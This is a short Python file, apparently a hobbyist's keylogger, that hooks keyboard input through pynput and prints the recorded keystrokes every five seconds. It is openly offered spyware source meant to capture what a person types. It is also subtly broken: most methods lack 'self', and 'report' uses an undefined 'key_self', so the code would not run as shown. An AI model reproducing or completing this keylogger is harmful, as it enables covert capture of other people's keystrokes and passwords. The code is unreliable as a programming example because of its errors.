import threading
import pynput.keyboard


class Keylogger:
    def __init__(self):
        self.log = ""

    
    def append_to_log(key_input):
        self.log += str(key_input)

    def process_key(key):
        try:
            current_key = key.char
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = ' ' + str(key) + ' '
        append_to_log(current_key)

    def report():
        print(key_self.log)
        key_self.log = ''
        timer = threading.Timer(5, self.report)
        timer.start()

    def start():
        keyboard_listener = pynput.keyboard.Listener(on_press=process_key)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()